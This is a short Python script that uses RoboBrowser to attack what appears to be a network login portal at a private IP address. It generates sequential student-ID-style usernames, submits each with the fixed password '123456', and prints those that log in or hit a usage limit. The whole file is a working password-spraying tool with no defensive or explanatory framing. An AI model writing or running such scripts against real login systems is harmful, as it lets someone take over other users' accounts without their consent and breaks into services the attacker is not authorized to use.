from robobrowser import RoboBrowser
import re
browser = RoboBrowser()
login_url = 'http://192.168.100.2:8090/'
browser.open(login_url)
form = browser.get_form(id='')
password='123456'
for l in range(3,4):
    for m in range(1,4):
        for k in range(1,4):
            for i in range(0,6):
                for j in range(0,10):
                    user = '1510'+str(m)+'001'+str(k)+'0'+str(i)+str(j)
                    user=str(user)
                    form['username'].value = user
                    form['password'].value = password
                    browser.submit_form(form)
                    text= str(browser.parsed)
                    if 'logged in' in text:
                        print(user)
                    if 'data' in text:
                        print(user)
                    if 'Maximum' in text:
                        print(user)

